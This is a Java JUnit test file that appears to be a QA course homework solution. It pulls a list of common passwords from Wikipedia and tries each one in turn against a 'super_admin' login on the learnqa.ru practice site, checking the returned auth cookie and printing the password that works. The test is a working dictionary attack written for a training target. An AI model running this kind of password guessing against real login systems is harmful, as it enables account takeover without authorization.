import io.restassured.path.xml.XmlPath;
import io.restassured.path.xml.element.Node;
import org.junit.jupiter.api.Test;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Set;

import static io.restassured.RestAssured.*;

public class SecretPasswordTest {
    @Test
    void secretPasswordTest() {
        // get all passwords by SplashData from wiki
        XmlPath response = get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
                .htmlPath();
        ArrayList<Node> passwords =
                response.get("**.find{ table -> table.caption.text().contains('SplashData')}.tbody.tr.td.findAll{ it.@align == 'left'}");
        // remove duplicate passwords and newlines at the end of a password (don't know why they are here)
        Set<String> uniquePasswords = new HashSet<>(
                passwords
                        .stream()
                        .map(Node::value)
                        .map(password -> password.replace("\n", "").replace("\r", ""))
                        .toList()
        );
        // set params
        HashMap<String, String> params = new HashMap<>();
        params.put("login", "super_admin");
        params.put("password", "");

        // find password
        for (String password : uniquePasswords) {
            params.replace("password", password);
            String authCookie = given()
                    .body(params)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .getCookie("auth_cookie");
            String passwordCheckResult = given()
                    .cookie("auth_cookie", authCookie)
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .asString();
            // If the password is found - print it and stop checking passwords
            if (!passwordCheckResult.equalsIgnoreCase("You are NOT authorized")) {
                System.out.printf("Password: '%s'\n", password);
                System.out.println(passwordCheckResult);
                break;
            }
        }
    }
}
